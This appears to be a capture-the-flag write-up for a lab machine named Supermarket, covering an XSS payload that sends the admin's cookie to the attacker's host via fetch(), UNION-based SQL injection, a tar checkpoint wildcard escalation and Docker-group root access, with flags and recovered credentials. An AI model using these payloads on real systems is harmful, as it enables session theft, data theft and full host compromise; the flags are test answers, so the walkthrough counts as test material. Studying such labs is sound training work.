🛒 CTF: Supermarket

- Target IP: "10.67.136.147"
- Date: 06/10/2026
- Approach: 100% Manual — No Metasploit

---

1. Reconnaissance

Port Scanning

I started with a basic Nmap scan to identify open ports and running services:

nmap -sV -sC 10.67.136.147

Open ports:

22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp    open  http    nginx 1.19.2
32768/tcp open  http    Node.js

Web Enumeration

I used Gobuster to enumerate directories:

gobuster dir -u http://10.67.136.147/ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

The following directories were discovered:

- "/Login"
- "/SignUp"
- "/Admin"
- "/Messages"

---

2. Initial Access

XSS — Session Hijacking

While interacting with the marketplace, I identified an XSS vulnerability in the new listing and reporting functionality.

The interesting part was that an administrator would review submitted listings. This made it possible to use the XSS to steal the administrator's session cookie.

I used the following payload:

<script>
fetch('http://<IP>:<PORT>/?cookie=' + btoa(document.cookie))
</script>

I hosted a Python HTTP server to receive the requests:

python3 -m http.server 8080

The first request contained my own cookie because I had viewed my own post. The second request came from the target machine, indicating that the administrator had viewed the malicious listing.

The received cookie was Base64 encoded.

I decoded it with:

echo "BASE64_COOKIE" | base64 -d

This revealed a JWT:

token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Decoding the JWT revealed:

{
  "userId": 2,
  "username": "michael",
  "admin": true,
  "iat": 1791332951
}

The important information was:

username: michael
admin: true

With the administrator's JWT, I was able to access the admin portal without performing a normal login.

---

3. SQL Injection

While exploring the admin functionality, I found an interesting parameter:

/admin?user=1

Adding a single quote caused a SQL error:

/admin?user=1'

This indicated a possible SQL injection vulnerability.

Determining the Number of Columns

I tested different "GROUP BY" values and determined that the query contained four columns.

I then tested:

1 UNION SELECT 1, DATABASE(), 3, 4

The database name was:

marketplace

Enumerating Tables

I used "information_schema" to enumerate the database tables:

1 UNION SELECT 1,
group_concat(table_name),
3,
4
FROM information_schema.tables
WHERE table_schema = database()

The following tables were identified:

items
messages
users

Enumerating the Users Table

I checked the columns of the "users" table:

1 UNION SELECT 1,
group_concat(column_name),
3,
4
FROM information_schema.columns
WHERE table_name='users'

The result was:

id
username
password
isAdministrator

I then queried the user with ID "1":

1 UNION SELECT 1,
group_concat(username, 0x3a, password),
3,
4
FROM users
WHERE id=1

This returned:

system:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW

The password was stored as a bcrypt hash.

I attempted to crack it using John the Ripper:

echo '$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW' > hash.txt

Then:

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

However, the hash did not crack after several minutes.

Instead of continuing to brute-force the password, I decided to use the SQL injection to enumerate more information.

---

4. Database Enumeration — Messages

I enumerated the columns of the "messages" table:

1 UNION SELECT 1,
group_concat(column_name),
3,
4
FROM information_schema.columns
WHERE table_name='messages'

The columns were:

id
user_from
user_to
message_content
is_read

I then queried the messages:

1 UNION SELECT 1,
group_concat(user_from, ':', message_content),
3,
4
FROM messages

One message contained:

Hello! An automated system has detected your SSH password is too weak
and needs to be changed. You have been generated a new temporary password.
Your new password is: @b_ENXkGYUCAv3zJ

I then queried both the sender and recipient:

1 UNION SELECT 1,
group_concat(user_from, ':', user_to, ':', message_content),
3,
4
FROM messages

This showed that the message was sent from user "1" to user "3".

Since I already had administrator access, I could identify user "3" through:

/admin?user=3

The user was:

jake

I then attempted SSH access:

ssh jake@10.67.136.147

Using the temporary password:

@b_ENXkGYUCAv3zJ

I successfully obtained a shell as "jake".

The user flag was also obtained at this stage.

---

5. Privilege Escalation

Local Enumeration

I started with basic privilege enumeration:

whoami
id

Result:

uid=1000(jake) gid=1000(jake) groups=1000(jake)

I then checked sudo permissions:

sudo -l

The important result was:

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh

This meant that "jake" could execute "/opt/backups/backup.sh" as "michael" without a password.

---

Abusing "backup.sh"

I checked the permissions:

ls -la /opt/backups/backup.sh

Result:

-rwxr-xr-x 1 michael michael 73 Aug 23 2020 /opt/backups/backup.sh

The script contained:

#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *

The wildcard at the end of the "tar" command was interesting.

Because "*" is expanded by the shell, filenames beginning with "--" could be interpreted as command-line options by "tar".

I used the "tar" checkpoint functionality to execute a command.

Initially, I attempted to use a reverse shell payload. This resulted in several errors, including permission problems and issues with the reverse-shell syntax.

I first discovered that the existing "backup.tar" file was owned by "jake":

ls -la /opt/backups/

drwxrwxrwt 2 root   root   4096 Aug 23 2020 .
drwxr-xr-x 4 root   root   4096 Aug 23 2020 ..
-rwxr-xr-x 1 michael michael 73 Aug 23 2020 backup.sh
-rw-rw-r-- 1 jake   jake   10240 Aug 23 2020 backup.tar

I removed the existing archive:

rm /opt/backups/backup.tar

The directory was writable, so I created the required filenames:

touch -- "--checkpoint=1"

and:

touch -- "--checkpoint-action=exec=bash"

The important part was that when "backup.sh" executed:

tar cf /opt/backups/backup.tar *

the wildcard expansion caused the command to effectively include:

--checkpoint=1
--checkpoint-action=exec=bash

Therefore, "tar" executed Bash with the privileges of "michael".

I executed the script with:

sudo -u michael /opt/backups/backup.sh

This resulted in a shell as:

uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)

---

6. Docker Privilege Escalation

The "michael" account belonged to the "docker" group:

groups=1002(michael),999(docker)

This provided another privilege escalation path.

I used Docker to mount the host filesystem:

docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh

This resulted in:

uid=0(root) gid=0(root)

I had successfully escalated to root.

The root flag was then obtained.

---

7. Attack Chain

The complete attack chain was:

XSS
  ↓
Admin Session Hijacking
  ↓
JWT
  ↓
Admin Portal
  ↓
SQL Injection
  ↓
Database Enumeration
  ↓
Messages Table
  ↓
Jake's Temporary SSH Password
  ↓
SSH
  ↓
sudo → michael
  ↓
tar Wildcard / Checkpoint Injection
  ↓
Michael Shell
  ↓
Docker Group
  ↓
Host Filesystem Mount
  ↓
Root

---

🏆 Flags

User Flag

THM{c3648ee7af1369676e3e4b15da6dc0b4}

Root Flag

THM{d4f76179c80c0dcf46e0f8e43c9abd62}

---

📝 Lessons Learned

What initially failed

I initially focused on the bcrypt hash belonging to the "system" user, but it was too difficult to crack with the available wordlist.

I then used the SQL injection to enumerate additional database information instead of continuing to brute-force the hash.

During privilege escalation, I initially attempted several reverse-shell payloads after discovering the vulnerable "tar" command. These attempts failed due to permission and shell compatibility issues.

Eventually, I realized that a reverse shell was unnecessary: since "tar" was already being executed as "michael", I could simply use its checkpoint functionality to spawn Bash directly.

Key concepts learned

- Cross-Site Scripting (XSS)
- Session hijacking
- JWT authentication
- SQL Injection
- Manual database enumeration through "information_schema"
- Credential disclosure through application data
- SSH access using recovered credentials
- "sudo" privilege escalation
- "tar" wildcard/checkpoint injection
- Docker-based privilege escalation
- Manual penetration testing without Metasploit

---

🔑 Credential Obtained Through SQL Injection

Username: jake
Password: @b_ENXkGYUCAv3zJ
Source: messages table exposed through UNION-based SQL injection